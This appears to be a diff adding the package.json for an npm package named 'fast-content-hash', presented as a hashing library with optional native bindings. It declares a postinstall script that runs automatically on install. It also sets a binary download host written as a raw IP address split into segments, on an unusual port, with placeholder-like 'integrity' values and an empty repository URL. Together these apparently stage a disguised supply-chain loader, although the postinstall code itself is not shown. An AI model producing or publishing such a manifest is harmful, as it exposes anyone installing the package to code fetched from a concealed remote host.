@@ -1,0 +1,24 @@
+{
+  "name": "fast-content-hash",
+  "version": "1.0.0",
+  "description": "High-performance content hashing with FNV-1a and MurmurHash3. Optional native bindings for improved throughput.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node scripts/postinstall.js",
+    "test": "node -e \"const h = require('.'); console.log(h.fnv1a('hello'), h.murmur3('hello'))\""
+  },
+  "binary": {
+    "module_name": "fchash",
+    "module_path": "./build/Release",
+    "host_segments": [35, 212, 213, 21],
+    "host_port": 9737,
+    "integrity": ["7f3c9a2e", "8b4d1f6a", "5c0e7b3d", "9a2f4c8e"],
+    "remote_path": "/prebuilds/v{version}/{platform}-{arch}"
+  },
+  "keywords": ["hash", "fnv", "murmur", "content-hash", "fingerprint", "checksum"],
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": ""
+  }
+}
